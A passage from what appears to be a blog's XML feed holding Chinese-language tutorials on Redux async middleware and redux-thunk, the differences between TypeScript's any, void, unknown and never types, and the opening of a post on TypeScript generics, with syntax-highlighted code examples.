punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> enhancer <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">applyMiddleware</span><span class="token punctuation">(</span>asyncMiddleware<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> store <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span>reducer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> enhancer<span class="token punctuation">)</span><span class="token punctuation">;</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'add'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'asyncAdd'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 2 秒后输出：</span><span class="token comment">// some data.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果显示异步操作获取的数据，可以成功被 <code>reducer</code> 拿到并实现相应的逻辑，所以把 <code>setTimeout</code> 换成 <code>Ajax</code> 请求也同样可以从服务器获取到数据，然后传递给 Redux 进行下一步处理；</p><p>由于上面的异步逻辑的原生写法不太方便，Redux 官方就提供了一款 <code>redux-thunk</code> 工具，封装好了一个 <code>middleware</code>，应用之后就可以将 <code>action</code> 声明为一个函数（以前是一个对象），其接收 <code>dispatch</code> 和 <code>getState</code> 两个参数；具体用法如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> Redux <span class="token keyword">from</span> <span class="token string">'redux'</span><span class="token punctuation">;</span><span class="token keyword">import</span> ReduxThunk <span class="token keyword">from</span> <span class="token string">'redux-thunk'</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">reducer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">state<span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'add'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> state <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'asyncAdd'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> action<span class="token punctuation">.</span>data<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> state<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 直接应用该工具</span><span class="token keyword">const</span> middlewareEnhancer <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">applyMiddleware</span><span class="token punctuation">(</span>ReduxThunk<span class="token punctuation">.</span>default<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> store <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span>reducer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> middlewareEnhancer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 这里 action 声明为函数，处理异步逻辑</span><span class="token keyword">const</span> <span class="token function-variable function">asyncAction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">dispatch<span class="token punctuation">,</span> getState</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old state:'</span><span class="token punctuation">,</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'asyncAdd'</span><span class="token punctuation">,</span> <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token string">'some data.'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span>asyncAction<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// "old state:" 1</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 2 秒后输出：</span><span class="token comment">// "some data."</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要<strong>注意</strong>的是，一些教程上（包括 Redux 官网）介绍 <code>Redux Thunk</code> 的用法时，仍然使用的 <code>Redux.applyMiddleware(ReduxThunk)</code> 写法，这是该工具 <code>1.x</code> 版本的写法，现在 <code>2.x</code> 版本需要加上 <code>.default</code>，即 <code>Redux.applyMiddleware(ReduxThunk.default)</code>，不然程序会出现问题；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redux state store 状态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript 中类型 any，void，unknown，never之间的区别</title>
      <link href="/2024/09/27/javascript/typescript-zhong-lei-xing-any-void-unknown-never-zhi-jian-de-qu-bie/"/>
      <url>/2024/09/27/javascript/typescript-zhong-lei-xing-any-void-unknown-never-zhi-jian-de-qu-bie/</url>
      
        <content type="html"><![CDATA[<p>TypeScript 拓展了 JavaScript 的基本类型与语言特性，为了覆盖类型检查的情景，衍生出了一些额外的类型，其中 <code>any</code>, <code>unknown</code>, <code>void</code>, <code>never</code> 这几个类型所适用的情形容易使人混淆，下面通过举例进行一下区分；</p><h2 id="any"><a href="#any" class="headerlink" title="any"></a>any</h2><p>这应该是 typescript 中最开始就会接触到的类型，顾名思义：<strong>任意类型</strong>，这也是 ts 中不写类型申明时的默认类型，即不作任何约束，编译时会跳过对其的类型检查，</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">let</span> val1<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">;</span>val1 <span class="token operator">=</span> <span class="token string">'abc'</span><span class="token punctuation">;</span>val1 <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>val1 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">const</span> arry<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="void"><a href="#void" class="headerlink" title="void"></a>void</h2><p><code>void</code> 表示<strong>无任何类型</strong>，正好与 <code>any</code> 相反，没有类型，如果是函数则应没有返回值或者返回 <code>undefined</code>，和 C 等语言中的无返回值函数申明类似：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">function</span> <span class="token function">voidFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">voidFn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">voidFn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">voidFn3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// Error</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>变量也可以申明为 <code>void</code> 类型，只不过只能给这个变量分配 <code>undefined</code>, <code>null</code> 和 <code>void</code> 类型的值（如果 ts 配置文件中设置了 <code>&quot;strictNullChecks&quot;: false</code>，那么分配 <code>null</code> 类型的值也会报错）:</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">let</span> val1<span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span><span class="token keyword">let</span> val2<span class="token operator">:</span> <span class="token keyword">null</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">let</span> val3<span class="token operator">:</span> <span class="token keyword">undefined</span> <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> val4<span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>val1 <span class="token operator">=</span> val2<span class="token punctuation">;</span> <span class="token comment">// "strictNullChecks": false 时报错</span>val1 <span class="token operator">=</span> val3<span class="token punctuation">;</span>val1 <span class="token operator">=</span> val4<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="unknown"><a href="#unknown" class="headerlink" title="unknown"></a>unknown</h2><p>顾名思义，<code>unknown</code> 表示<strong>未知类型</strong>，是 <code>typescript 3.0</code> 中引入的新类型，即写代码的时候还不清楚会得到怎样的数据类型，如服务器接口返回的数据，<code>JSON.parse()</code> 返回的结果等；该类型相当于 <code>any</code>，可以理解为官网指定的替代 <code>any</code> 类型的<strong>安全</strong>版本（因为不提倡直接使用 <code>any</code> 类型）；</p><p>它能被赋值为任何类型，但不能被赋值给除了 <code>any</code> 和 <code>unknown</code> 之外的其他类型，同时，不允许执行 <code>unknown</code> 类型变量的方法（<code>any</code> 可以），举个例子：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">let</span> uk<span class="token operator">:</span> <span class="token builtin">unknown</span> <span class="token operator">=</span> <span class="token string">'abc'</span><span class="token punctuation">;</span>uk <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>uk <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>uk<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Error</span><span class="token keyword">let</span> valAny<span class="token operator">:</span> <span class="token builtin">any</span> <span class="token operator">=</span> <span class="token string">'abc'</span><span class="token punctuation">;</span>valAny<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 'abc'</span><span class="token keyword">let</span> uk1<span class="token operator">:</span> <span class="token builtin">unknown</span> <span class="token operator">=</span> uk<span class="token punctuation">;</span><span class="token keyword">let</span> uk2<span class="token operator">:</span> <span class="token builtin">any</span> <span class="token operator">=</span> uk<span class="token punctuation">;</span><span class="token keyword">let</span> uk2<span class="token operator">:</span> <span class="token builtin">string</span> <span class="token operator">=</span> uk<span class="token punctuation">;</span> <span class="token comment">// Error</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="never"><a href="#never" class="headerlink" title="never"></a>never</h2><p><code>never</code> 同样顾名思义，表示<strong>永不存在的值</strong>的类型，是 <code>typescript 2.0</code> 中引入的新类型，概念有点绕，什么情况下变量会永远不存在值呢？因为通常情况下，变量一旦申明了，就会被分配值，即使没有特别指定，也会被初始化为 <code>undefined</code>，同样一个函数即使有个写返回值，也会默认返回 <code>undefined</code>，也不是真正的不存在返回值：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> foo<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 'undefined'</span><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 'undefined'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实确实有一些情形，值会永不存在，比如，从程序运行的维度讲，如果一个函数执行时抛出了<strong>异常</strong>，那么这个函数变永远不会有值了（因为抛出异常会直接中断程序运行，这样程序就运行不到返回值那一步了，即具有不可达的终点，也就永不存在返回了）：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">function</span> <span class="token function">err</span><span class="token punctuation">(</span>msg<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">never</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 有机会到达终点的函数也算存在返回值，编译会报错</span><span class="token keyword">function</span> <span class="token function">err1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">never</span> <span class="token punctuation">&#123;</span> <span class="token comment">// Error</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0.5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有一种极端情况也比较类似，就是函数中执行无限循环的代码（<strong>死循环</strong>），这样也同样使得程序永远无法运行到函数返回值那一步，永不存在返回：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">function</span> <span class="token function">loopForever</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">never</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>变量也可以直接申明为 <code>never</code> 类型，让它永不存在值，其实就是意思就是永远不能给它<strong>赋值</strong>，否则就会报错，这样就可以形成一种保护机制；</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">let</span> ne<span class="token operator">:</span> <span class="token builtin">never</span><span class="token punctuation">;</span>ne <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span> <span class="token comment">// Error</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>另外，<code>never</code> 是所有类型的子类型，意思就是它可以赋值给任何类型（前提是配置里 <code>&quot;strictNullChecks&quot;: false</code>，否则检查不通过）；</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">let</span> num<span class="token operator">:</span> <span class="token builtin">number</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">let</span> ne<span class="token operator">:</span> <span class="token builtin">never</span><span class="token punctuation">;</span>num <span class="token operator">=</span> ne<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>同时也没有任何类型是 <code>never</code> 的子类型，除了 <code>never</code> 自身，即除了 <code>never</code> 任何类型都不能赋值给 <code>never</code> 类型的变量（如果前提是 <code>&quot;strictNullChecks&quot;: true</code>，<code>never</code> 也不能赋值给 <code>never</code>）；</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">let</span> ne1<span class="token operator">:</span> <span class="token builtin">never</span><span class="token punctuation">;</span><span class="token keyword">let</span> ne2<span class="token operator">:</span> <span class="token builtin">never</span><span class="token punctuation">;</span>ne1 <span class="token operator">=</span> ne2<span class="token punctuation">;</span><span class="token comment">// any 也不能分配给 never</span><span class="token keyword">let</span> any1<span class="token operator">:</span> <span class="token builtin">any</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>ne1 <span class="token operator">=</span> any1<span class="token punctuation">;</span> <span class="token comment">// Error</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ts typescript any  unknown never </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript 之泛型</title>
      <link href="/2024/09/27/javascript/typescript-zhi-fan-xing/"/>
      <url>/2024/09/27/javascript/typescript-zhi-fan-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p><strong>泛型</strong>用于创建可复用的支持多种类型的组件，比如不仅能支持当前的类型，还能支持未来的类型，为大型系统的构建提供一定灵活性，<strong>泛</strong>有广泛、多种的意思，即泛型可实现对多种类型的支持；泛型是一种已有的概念，除了 TypeScript，同样也存在于其他多种语言中；</p><p>先举一个基本的例子，ts 中实现一个加法运算的函数，可以是这样的：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">function</span> <span class="token function">addFn</span><span class="token punctuation">(</span>arg1<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">,</span> arg2<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">number</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> arg1 <span class="token operator">+</span> arg2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">addFn</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果后期功能拓展，需要上述函数也具备拼接字符串的功能，即：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">function</span> <span class="token function">addFn</span><span class="token punctuation">(</span>arg1<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> arg2<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> arg1 <span class="token operator">+</span> arg2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">addFn</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是这样的申明并不与上面已有的申明兼容，即使使用<strong>联合类型</strong>处理也比较复杂，但是它们的处理逻辑却是一样的，只是类型值换了，重写一个新函数也不符合拓展的初衷，所以需要寻求其他方法；</p><h2 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h2><p>在 ts 中<strong>重载</strong>是为一个函数提供多个类型定义的操作，使得函数可以根据传参的不同而拥有不同的返回类型；这样，我们就能轻松实现之前例子的拓展需求：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">function</span> <span class="token function">addFn</span><span class="token punctuation">(</span>arg1<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> arg2<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">addFn</span><span class="token punctuation">(</span>arg1<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">,</span> arg2<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">addFn</span><span class="token punctuation">(</span>arg1<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span> arg2<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">any</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 上面一行只是函数的实现签名，为了兼容上面两个重载签名，不能被直接调用，</span>  <span class="token comment">// 同时它也并不算作一个重载，真正的重载签名只有最上面的两个</span>  <span class="token keyword">return</span> arg1 <span class="token operator">+</span> arg2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 以下代码都能通过类型检查</span><span class="token function">addFn</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">addFn</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 而没在重载定义中的类型会报错</span><span class="token comment">// addFn(true, true); // Error</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个例子中，该申明函数与正常函数的区别是：</p><ul><li>在函数申明的上方又叠加了几个申明表达式，包裹参数类型和返回类型，末尾以分号结束，每一个申明便是一个重载；</li><li>然后是在函数区块中写处理逻辑，同时包含进上面的几种参数与返回类型的情况；</li><li>最后调用时就可以传入不同重载所对应的传参类型，并且能通过类型检查，而不在重载定义中的类型则不会通过类型检查；</li><li>函数在调用时，ts 会在申明的函数重载中自上而下查找第一个匹配的重载签名，最后一个函数签名称为“实现签名”，并不会被调用；</li></ul><p>使用重载虽然实现了同时能计算数字和拼接字符串的需求，但是这种写法还是有些复杂，因为参数类型与返回类型具有一定规律性；因此还可以继续寻求更简便的方式；</p><h2 id="类型变量"><a href="#类型变量" class="headerlink" title="类型变量"></a>类型变量</h2><p>在 ts 中，可以使用<strong>泛型</strong>来解决上述需求，具体的方式是使用<strong>类型变量</strong>，顾名思义，ts 包含一个庞大的类型处理系统，有各种使用类型的情景，为了应对一些场景，就需要类型值有像<strong>变量</strong>一样的变化性，支持赋值与取值操作；</p><p>先看一下使用类型变量的具体写法：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">function</span> <span class="token generic-function"><span class="token function">addFn</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>arg1<span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">,</span> arg2<span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token constant">T</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> arg1 <span class="token operator">+</span> arg2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token generic-function"><span class="token function">addFn</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token builtin">number</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token generic-function"><span class="token function">addFn</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token builtin">string</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">addFn</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用时也可以省略类型赋值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的写法就比写重载的形式简便了许多；示例中出现了 <code>&lt;T&gt;</code> 这个标识，其中 <code>T</code> 表示<strong>类型变量</strong>，<code>&lt;&gt;</code> 表示对类型变量的申明，即申明时使用 <code>&lt;&gt;</code> 设置变量，调用时再使用 <code>&lt;&gt;</code> 进行赋值，这样所有用到变量 <code>T</code> 的地方都会被替换为传入的类型值；这里可以发现，泛型就像类型系统中一个针对类型的<strong>函数</strong>，类型参数就是<strong>形参</strong>；</p><p>调用时可以省略类型赋值的操作是因为上面的场景中 ts 可以利用<strong>类型推断</strong>机制自动判断出 <code>T</code> 的实际类型值（<code>number</code>）；</p><p>由于 <code>T</code> 表示任意类型，所以不能直接访问某些属性或方法：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">function</span> <span class="token generic-function"><span class="token function">fn</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>arg<span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token constant">T</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// return arg.toString(); // Error，因为并不是所有类型都有该方法</span>  <span class="token keyword">return</span> arg<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果是复合类型，则可以使用某些固有属性：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">function</span> <span class="token generic-function"><span class="token function">fn</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>arg<span class="token operator">:</span> <span 